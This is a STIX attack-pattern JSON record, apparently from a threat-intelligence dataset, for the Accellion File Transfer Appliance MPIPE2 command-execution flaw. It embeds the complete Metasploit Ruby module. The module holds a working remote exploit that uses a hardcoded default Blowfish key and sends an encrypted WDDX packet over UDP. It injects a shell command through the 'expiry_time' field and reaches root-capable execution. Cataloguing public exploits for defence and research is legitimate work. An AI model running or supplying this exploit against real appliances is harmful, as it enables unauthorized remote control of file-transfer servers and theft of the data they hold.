{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--924451dc-b185-4638-a44a-38f0d0764387",
    "created": "2024-08-14T16:57:29.146366Z",
    "modified": "2024-08-14T16:57:29.14637Z",
    "name": "Accellion FTA MPIPE2 Command Execution",
    "description": " This module exploits a chain of vulnerabilities in the Accellion File Transfer appliance. This appliance exposes a UDP service on port 8812 that acts as a gateway to the internal communication bus. This service uses Blowfish encryption for authentication, but the appliance ships with two easy to guess default authentication keys. This module abuses the known default encryption keys to inject a message into the communication bus. In order to execute arbitrary commands on the remote appliance, a message is injected into the bus destined for the 'matchrep' service. This service exposes a function named 'insert_plugin_meta_info' which is vulnerable to an input validation flaw in a call to system(). This provides access to the 'soggycat' user account, which has sudo privileges to run the primary admin tool as root. These two flaws are fixed in update version FTA_8_0_562. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/accellion_fta_mpipe2.rb",
            "external_id": "accellion_fta_mpipe2.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.rapid7.com/security-center/advisories/R7-0039.jsp"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\nrequire 'rexml/element'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Accellion FTA MPIPE2 Command Execution',\n      'Description'    => %q{\n          This module exploits a chain of vulnerabilities in the Accellion\n        File Transfer appliance. This appliance exposes a UDP service on\n        port 8812 that acts as a gateway to the internal communication bus.\n        This service uses Blowfish encryption for authentication, but the\n        appliance ships with two easy to guess default authentication keys.\n        This module abuses the known default encryption keys to inject a\n        message into the communication bus. In order to execute arbitrary\n        commands on the remote appliance, a message is injected into the bus\n        destined for the 'matchrep' service. This service exposes a function\n        named 'insert_plugin_meta_info' which is vulnerable to an input\n        validation flaw in a call to system(). This provides access to the\n        'soggycat' user account, which has sudo privileges to run the\n        primary admin tool as root. These two flaws are fixed in update\n        version FTA_8_0_562.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '71362'],\n          ['OSVDB', '71363'],\n          ['URL', 'http://www.rapid7.com/security-center/advisories/R7-0039.jsp'],\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2011-02-07'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8812),\n        OptString.new('APPID', [true, 'The application ID (usually 1000)', '1000'])\n      ])\n  end\n\n  def exploit\n    connect_udp\n\n    appid = datastore['APPID']\n    encoded_command = REXML::Text.new(payload.encoded).to_s\n\n    wddx = %Q|\n<wddxPacket version='1.0'>\n<header/>\n<data>\n  <struct>\n    <var name='50001'><string>insert_plugin_meta_info</string></var>\n    <var name='file_handle'><binary length='9'>MDAwMDAwMDAw</binary></var>\n    <var name='aid'><string>#{appid}</string></var>\n    <var name='client_ip'><string>127.0.0.1</string></var>\n    <var name='package_id'><string>1</string></var>\n    <var name='recipient_list'><array length='1'><string>#{Rex::Text.rand_text_alphanumeric(8)}</string></array></var>\n    <var name='expiry_time'><string>&apos;; #{encoded_command}; #&apos;</string></var>\n  </struct>\n</data>\n</wddxPacket>|\n\n    packet = [\n      rand(0xffffffff),\t# Source Location ID\n      8888,\t\t\t\t# Destination Location ID\n      rand(0xffff),\t\t# Source Application\n      50001,\t\t\t\t# Destination Application (matchrep)\n      Time.now.to_i\n    ].pack(\"NNnnN\") + wddx\n\n    header = [\n      0,\t\t# Flags\n      0,\t\t#\n      1,\t\t# Sequence Number (must be the lowest seen from Source ID)\n      33\t\t# Execute (pass message to destination)\n    ].pack(\"CCNC\") + packet\n\n    data = [ simple_checksum(header) ].pack(\"n\") + header\n    enc  = blowfish_encrypt(\"123456789ABCDEF0123456789ABCDEF0\", data)\n\n    udp_sock.put(\"\\x01\" + enc)\n\n    handler\n    disconnect_udp\n  end\n\n  def simple_checksum(data)\n    sum = 0\n    data.unpack(\"C*\").map{ |c| sum = (sum + c) & 0xffff }\n    sum\n  end\n\n  #\n  # This implements blowfish-cbc with an MD5-expanded 448-bit key\n  # using RandomIV for the initial value.\n  #\n  def blowfish_encrypt(pass, data)\n\n    # Forces 8-bit encoding\n    pass = pass.unpack(\"C*\").pack(\"C*\")\n    data = data.unpack(\"C*\").pack(\"C*\")\n\n    # Use 448-bit keys with 8-byte IV\n    key_len = 56\n    iv_len  = 8\n\n    # Expand the key with MD5 (key-generated-key mode)\n    hash = OpenSSL::Digest::MD5.digest(pass)\n    while (hash.length < key_len)\n      hash << OpenSSL::Digest::MD5.digest(hash)\n    end\n\n    key = hash[0, key_len]\n    iv  = Rex::Text.rand_text(iv_len)\n\n    c = OpenSSL::Cipher.new('bf-cbc')\n    c.encrypt\n    c.key_len = key_len\n    c.key     = key\n    c.iv      = iv\n\n    \"RandomIV\" + iv + c.update(data) + c.final\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-02-07",
    "x_mitre_platforms": [
        "['unix']"
    ]
}